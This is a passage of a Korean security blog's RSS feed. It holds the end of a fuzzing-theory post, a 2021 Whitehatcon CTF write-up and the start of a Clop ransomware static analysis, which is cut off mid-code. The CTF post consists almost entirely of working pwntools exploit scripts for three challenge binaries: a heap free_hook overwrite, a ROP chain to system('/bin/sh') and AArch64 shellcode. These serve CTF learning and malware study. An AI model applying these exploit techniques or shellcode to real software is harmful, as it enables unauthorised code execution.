좋은 Fuzzer도 모든 취약점을 발견할 수 없다.</li><li>Fuzzing 결과에 취약점이 없다 해도 그 프로그램은 100% 안전한 게 아니다.</li><li>발견된 취약점은 검증이 반드시 필요하다.</li></ul><h2 id="What-in-needed-for-fuzzing"><a href="#What-in-needed-for-fuzzing" class="headerlink" title="What in needed for fuzzing?"></a>What in needed for fuzzing?</h2><ul><li>Input이 있는 Fuzzing 대상</li><li>찾고 싶은 취약점 종류</li><li>사용할 Fuzzer</li></ul><h2 id="What-types-of-bug-can-a-fuzzer-find"><a href="#What-types-of-bug-can-a-fuzzer-find" class="headerlink" title="What types of bug can a fuzzer find?"></a>What types of bug can a fuzzer find?</h2><ul><li>이론 상 모든 종류의 취약점을 찾을 수 있음</li><li>Logical Bug 보다 Memory Corruption 종류가 찾기 더 쉬움</li></ul><h2 id="Architecture-of-a-typical-fuzzer"><a href="#Architecture-of-a-typical-fuzzer" class="headerlink" title="Architecture of a typical fuzzer"></a>Architecture of a typical fuzzer</h2><ul><li>전형적인 Fuzzer의 3가지 구조.</li><li>Test Case Generator - Worker에서 사용할 input을 생성</li><li>Logger - bug분석에 필요한 모든 것을 기록 (input, 결과)</li><li>Worker - input을 가지고 fuzzing 실행, 버그 탐지</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/138283140-7d929031-0f20-42ea-bce0-9d7efb2fe0f5.png" alt="fuzzer-architecture"></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://labs.f-secure.com/blog/what-the-fuzz/">https://labs.f-secure.com/blog/what-the-fuzz/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/20/2021-10-21-WTF/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021 Whitehatcon CTF</title>
      <link>https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/</link>
      <guid>https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/</guid>
      <pubDate>Wed, 20 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2021 Whitehatcontest CTF Write-up &lt;/center&gt;

&lt;p&gt;I’m very happy that our team came in 24th in this CTF and i solve 3 problems. I write about it a month after the CTF. Actually i forgot how to solve them. that’s why i need to check binary files again. but i lost binary files, could only find payload. So this post has only payload.TT&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2021 Whitehatcontest CTF Write-up </center><p>I’m very happy that our team came in 24th in this CTF and i solve 3 problems. I write about it a month after the CTF. Actually i forgot how to solve them. that’s why i need to check binary files again. but i lost binary files, could only find payload. So this post has only payload.TT</p><span id="more"></span><h2 id="chunk-manager"><a href="#chunk-manager" class="headerlink" title="chunk_manager"></a>chunk_manager</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocMem</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMem</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillMem</span>(<span class="params">idx,offset,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;in:\n&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">freeMem</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">allocMem(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">1</span>,<span class="number">0x409</span>)</span><br><span class="line">allocMem(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">41</span>,<span class="number">8</span>):</span><br><span class="line">    fillMem(<span class="number">0</span>,i,<span class="string">&#x27;PPPPPPPP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printMem(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">7</span>:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="string">&quot;leak: &quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">log.info(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">oneshot = <span class="number">0x10a41c</span> + libcbase</span><br><span class="line">oneshot = <span class="number">0x4f432</span> + libcbase</span><br><span class="line"><span class="comment">#oneshot = 0x4f3d5 + libcbase</span></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap</span></span><br><span class="line">allocMem(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">4</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">5</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">4</span>)</span><br><span class="line">freeMem(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,<span class="string">&#x27;AAAAAAAC&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">printMem(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">leak = u64(leak+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak)))</span><br><span class="line">log.info(<span class="string">&quot;heap: &quot;</span> +<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">heapbase = leak - <span class="number">0xc0</span> + <span class="number">0x50</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#overwrite topchunk</span></span><br><span class="line"><span class="comment">#topchunk = leak + 0x410</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="comment">#log.info(&quot;top_chunk: &quot; + hex(topchunk))</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fillMem(2,40,p64(0xffffffffffffffff))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">size = (free_hook - 0x20 - 0x10 - topchunk)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">allocMem(9,str(size))</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">allocMem(4,0x200)</span></span><br><span class="line"><span class="string">fillMem(4,0,&#x27;AAAAAAAAA&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">printMem(1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">fillMem(<span class="number">0</span>,(free_hook-heapbase-<span class="number">0x10</span>),p64(oneshot))</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="string-manger"><a href="#string-manger" class="headerlink" title="string manger"></a>string manger</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./binary&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copyString</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;copy size ? &#x27;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyString</span>(<span class="params">data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content : &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmpString</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;compare size ? &#x27;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">oneshot</span>):</span></span><br><span class="line">    oneshot = pack(<span class="string">&#x27;&gt;q&#x27;</span>,oneshot)</span><br><span class="line">    oneshot = oneshot[<span class="number">2</span>:]</span><br><span class="line">    oneshot = u64(<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(oneshot)) + oneshot)</span><br><span class="line">    <span class="keyword">return</span> oneshot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span></span><br><span class="line"></span><br><span class="line">modifyString(payload)</span><br><span class="line">pause()</span><br><span class="line">copyString(<span class="built_in">str</span>(<span class="number">55</span>))</span><br><span class="line">pause()</span><br><span class="line">cmpString(<span class="built_in">str</span>(<span class="number">55</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;string1 : &#x27;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&#x27; a&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>]</span><br><span class="line">leak = u64(leak+ <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libcleak = pack(<span class="string">&#x27;&gt;q&#x27;</span>,leak)</span><br><span class="line">libcleak = libcleak[<span class="number">2</span>:]</span><br><span class="line">libcleak = u64(libcleak + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(libcleak)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(libcleak))</span><br><span class="line"></span><br><span class="line">libcbase = libcleak - <span class="number">0x3fc39f</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libcbase : &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">oneshot = libcbase + <span class="number">0x10a41c</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f432</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"><span class="comment">#overwrite ret</span></span><br><span class="line">ret = libcbase + <span class="number">0x001d84d3</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">prdi = libcbase + <span class="number">0x0016609c</span></span><br><span class="line"></span><br><span class="line">system = convert(system)</span><br><span class="line">binsh = convert(binsh)</span><br><span class="line">prdi = convert(prdi)</span><br><span class="line">ret = convert(ret)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">oneshot = pack(&#x27;&gt;q&#x27;,oneshot)</span></span><br><span class="line"><span class="string">oneshot = oneshot[2:]</span></span><br><span class="line"><span class="string">oneshot = u64(b&#x27;\x00&#x27;*(8-len(oneshot)) + oneshot)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print (hex(oneshot))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;BBBB&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span>*<span class="number">13</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += <span class="string">b&#x27;E&#x27;</span></span><br><span class="line"></span><br><span class="line">modifyString(payload)</span><br><span class="line">copyString(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="am"><a href="#am" class="headerlink" title="am"></a>am</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process([&#x27;qemu-aarch64-static&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./am&#x27;])</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;./am&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400E14</span></span><br><span class="line"></span><br><span class="line">size = <span class="number">0x412078</span></span><br><span class="line">malloc = <span class="number">0x412088</span></span><br><span class="line">count = <span class="number">0x4120d8</span></span><br><span class="line">syscall = <span class="number">0x400938</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span>*<span class="number">13</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;KEYWORD\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">4</span>:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x40\x00\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(leak))</span><br><span class="line">stack = leak - <span class="number">0x78</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += shellcode</span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">0x70</span>-<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += p64(0x04136b0)</span></span><br><span class="line">payload += p64(stack)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;KEYWORD\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Clop Ransomware</title>
      <link>https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/</link>
      <guid>https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/</guid>
      <pubDate>Mon, 24 May 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;Clop // Ransomware&lt;/center&gt; 


&lt;h1 id=&quot;File-info&quot;&gt;&lt;a href=&quot;#File-info&quot; class=&quot;headerlink&quot; title=&quot;File info&quot;&gt;&lt;/a&gt;File info&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;Info&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Value&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;SHA256&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;File Size&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;183KB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;File Type&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;.exe(win32)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Function&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Crypto&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>Clop // Ransomware</center> <h1 id="File-info"><a href="#File-info" class="headerlink" title="File info"></a>File info</h1><table><thead><tr><th align="center">Info</th><th align="center">Value</th></tr></thead><tbody><tr><td align="center">SHA256</td><td align="center">3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b</td></tr><tr><td align="center">File Size</td><td align="center">183KB</td></tr><tr><td align="center">File Type</td><td align="center">.exe(win32)</td></tr><tr><td align="center">Function</td><td align="center">Crypto</td></tr></tbody></table><span id="more"></span><h1 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h1><h3 id="분석환경"><a href="#분석환경" class="headerlink" title="분석환경"></a>분석환경</h3><ul><li>OS : Windows10</li><li>Tools : IDA Pro, 010Editor</li></ul><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p><img src="https://user-images.githubusercontent.com/49066484/119482051-62787800-bd8e-11eb-8c95-465fce53284a.png" alt="그림1"></p><p>Clop Sample을 다운 받은 후 IDA로 확인했을때의 모습이다. 바이너리가 호출하는 함수의 개수가 적은 것으로 보아 바로 악성행위를 분석할 수 있을 것 같지 않다.  <code>Line115</code>에서 for문을 500000번을 도는데 이는 단순히 동적 분석을 방해하는 fake코드 인 것 같다. 해당 루프를 탈출하면 <code>Line140</code>의 조건문으로 들어가게 된다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119482059-64423b80-bd8e-11eb-917c-a2353c279bb4.png" alt="그림2"></p><p>조건문안에는 쓰이지 않는 값들을 변수에 할당해주며 마지막에 <code>401000()</code>을 호출한다. </p><p><img src="https://user-images.githubusercontent.com/49066484/119483549-0dd5fc80-bd90-11eb-83ec-e440d60596cd.png" alt="그림3"></p><p><code>401000()</code>에서는 <code>VirtualAlloc</code>을 통해 메모리를 할당하게 되는데 빨간 박스 부분에서 할당한 메모리에 값을 쓰게된다. 여기서 <code>Line 176, 183, 185</code>가 연산에 쓰이는 핵심 코드이며 나머지는 쓰레기 코드이다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119483553-0f072980-bd90-11eb-98fb-d364210b2444.png" alt="그림4"></p><p>위 과정에서 입력한 내용을 <code>Line232</code>에서 호출하는 것으로 보아, 다음 단계로 넘어가기 위해 <code>Shellcode</code>를 쓰고 호출하는 것을 예상할 수 있다.  내용을 입력할 때 사용한 코드를 아래와 같이 python으로 똑같이 구현하여 쉘코드를 추출할 수 있었다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clop&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span 